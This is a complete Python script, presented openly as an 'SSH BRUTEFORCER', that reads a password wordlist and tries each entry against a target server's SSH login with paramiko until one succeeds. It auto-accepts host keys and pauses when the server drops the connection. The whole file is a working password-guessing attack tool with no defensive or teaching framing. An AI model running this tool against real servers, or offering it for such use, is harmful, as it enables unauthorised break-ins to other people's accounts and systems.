#!/bin/python3 
import threading
from threading import *
import time
import os
import paramiko
import sys
import argparse
from colorama import *
import colorama
def banner():
 banner="""
                  ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄
       ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
      ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
     ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
    ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █
   ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
  ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
 """
 return banner
def parse():
 global host,user,port,path_to_file,start_time
 print(banner())
 parser = argparse.ArgumentParser(description="SSH BRUTEFORCER V 0.1")
 parser.add_argument("host", help="IP Address of server")
 parser.add_argument("wordlist", help="First file with passwords")
 parser.add_argument("-U", "--user", help="Username")
 parser.add_argument("-P","--port",help="Port to ssh")
 args = parser.parse_args()
 host = args.host
 path_to_file=args.wordlist
 user = args.user
 port=args.port
 start_time=time.time()
def main():
 parse()
 connection()
 get_password()
def get_password():
  with open (path_to_file,'r') as file:
   for password in file.readlines():
    thread=threading.Thread(target=bruteforce,args=(password.strip(),))
    thread.start()
    thread.join()
def connection():
  global client
  client = paramiko.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
def bruteforce(password):
 try:
   client.connect(hostname=host, username=user, password=password, port=port)
 except paramiko.ssh_exception.AuthenticationException:
   print("Wrong:{}".format(password))
 except paramiko.SSHException:
   print("Server closed connection(Waiting 15 seconds)")
   time.sleep(15)
 else:
   print(Fore.GREEN+"PASSWORD WAS FOUND!:{}".format(password)+"\nTime:{}".format(get_time())+Fore.RESET)
   sys.exit()
   client.close()
   exit()
def get_time():
  end_time=time.time()
  result=end_time-start_time
  return str(result)
main()

